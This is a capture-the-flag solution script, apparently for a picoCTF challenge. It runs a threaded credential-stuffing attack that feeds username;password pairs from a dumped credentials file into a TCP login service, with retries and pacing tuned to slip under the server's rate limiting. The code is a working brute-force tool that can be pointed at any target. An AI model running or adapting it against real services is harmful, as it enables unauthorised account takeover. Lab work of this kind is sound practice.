This challenge has rate limiting. 

Here is the script to solve the challenge:

import socket
import concurrent.futures
import threading
import time
import sys

# YAHAN NAYA HOST AUR PORT DAAL
host = "xebec.cylabacademy.net" 
port = 26207 

# REDUCED FROM 20 TO 5 TO PREVENT SERVER RATE-LIMITING
NUM_THREADS = 5  
found = threading.Event()
flag_result = None
lock = threading.Lock()

# Stats tracking
stats = {
    "confirmed_invalid": 0,
    "total_tried": 0
}
total_creds = 0

# Hide cursor
sys.stdout.write("\033[?25l")
sys.stdout.flush()

def update_header():
    with lock:
        inv = stats["confirmed_invalid"]
        tot = stats["total_tried"]
        # Calculate roughly how much is done
        pct = (tot / total_creds) * 100 if total_creds > 0 else 0
        
        # Progress bar
        bar_length = 30
        filled = int(bar_length * tot // total_creds) if total_creds > 0 else 0
        bar = '█' * filled + '-' * (bar_length - filled)
        
        # ANSI code to move to line 3 and update
        sys.stdout.write(f"\033[3;1H\033[2K")
        sys.stdout.write(f"[*] Progress: [{bar}] {pct:.1f}% | Confirmed Invalid: {inv} / {total_creds} | Tried: {tot}")
        sys.stdout.flush()

def update_line(line_num, text):
    sys.stdout.write(f"\033[{line_num};1H\033[2K{text}")
    sys.stdout.flush()

def check_login(creds_item, thread_id, basket_size):
    global flag_result
    user, pwd = creds_item
    line_num = thread_id + 4 # Top 4 lines for header/stats
    
    # Retry loop: 5 attempts per credential
    for attempt in range(5):
        if found.is_set():
            return None
            
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6) # Slightly higher timeout for safety
            s.connect((host, port))
            
            s.recv(1024) # Banner
            s.sendall((user + "\n").encode())
            
            # Wait for Password prompt
            buffer = b""
            while b"Password:" not in buffer:
                chunk = s.recv(1024)
                if not chunk: break
                buffer += chunk
                
            s.sendall((pwd + "\n").encode())
            
            # Wait for explicit confirmation
            res = b""
            while True:
                if b"Invalid" in res or b"picoCTF" in res or b"Welcome" in res:
                    break
                chunk = s.recv(1024)
                if not chunk: 
                    break
                res += chunk
                
            s.close()
            
            decoded_res = res.decode(errors='ignore').strip()
            display_res = decoded_res if len(decoded_res) < 40 else decoded_res[:37] + "..."
            
            # SUCCESS
            if b"picoCTF" in res or b"Welcome" in res:
                with lock:
                    if not found.is_set():
                        found.set()
                        flag_result = (user, pwd, decoded_res)
                        update_line(line_num, f"Thread {thread_id:02d} | [SUCCESS] {user}:{pwd} -> {display_res}")
                return True
                
            # CONFIRMED INVALID
            elif b"Invalid" in res:
                with lock:
                    stats["confirmed_invalid"] += 1
                    stats["total_tried"] += 1
                update_line(line_num, f"Thread {thread_id:02d} | [FAILED] {user}:{pwd} -> Confirmed Invalid")
                update_header()
                return None
                
        except Exception:
            # Connection failed, print retry status
            update_line(line_num, f"Thread {thread_id:02d} | [ERROR] {user}:{pwd} -> Retry {attempt+1}/5")
            time.sleep(1.0) # Increased backoff time to let server breathe
            
    # Agar 5 retries ke baad bhi connect nahi hua, toh usko skip karo par stat update karo
    with lock:
        stats["total_tried"] += 1
    update_header()
    return None

# Load credentials
creds = []
with open("creds-dump.txt", "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        if ";" in line:
            parts = line.strip().split(";", 1)
            if len(parts) == 2:
                creds.append((parts[0].strip(), parts[1].strip()))

total_creds = len(creds)

# Distribute creds into 5 baskets
baskets = [[] for _ in range(NUM_THREADS)]
for i, cred in enumerate(creds):
    baskets[i % NUM_THREADS].append(cred)

sys.stdout.write("\033[2J\033[H") # Clear screen
print(f"[*] Target: {host}:{port}")
print(f"[*] Loaded {total_creds} creds. Split into {NUM_THREADS} baskets of ~{total_creds//NUM_THREADS} each.")
update_header()
print("-" * 90)

def worker(basket, thread_id):
    time.sleep(thread_id * 0.2) # Stagger start
    for cred in basket:
        if found.is_set():
            break
        check_login(cred, thread_id, len(basket))

# Start the threads
with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
    futures = []
    for i in range(NUM_THREADS):
        futures.append(executor.submit(worker, baskets[i], i + 1))
        
    for future in concurrent.futures.as_completed(futures):
        if found.is_set():
            break

# Move cursor to the bottom and show it again
sys.stdout.write(f"\033[{NUM_THREADS+6};1H\033[?25h")
sys.stdout.flush()

print("\n" + "="*70)
if flag_result:
    print(f"[+] FLAG FOUND! Creds: {flag_result[0]}:{flag_result[1]}")
    print(f"[+] RAW RESPONSE:\n{flag_result[2]}")
else:
    print("[-] Flag nahi mila. Total attempts finished.")
    print(f"[*] Confirmed Invalid: {stats['confirmed_invalid']}")
    print("[*] Command: nc xebec.cylabacademy.net 26207")
print("="*70)
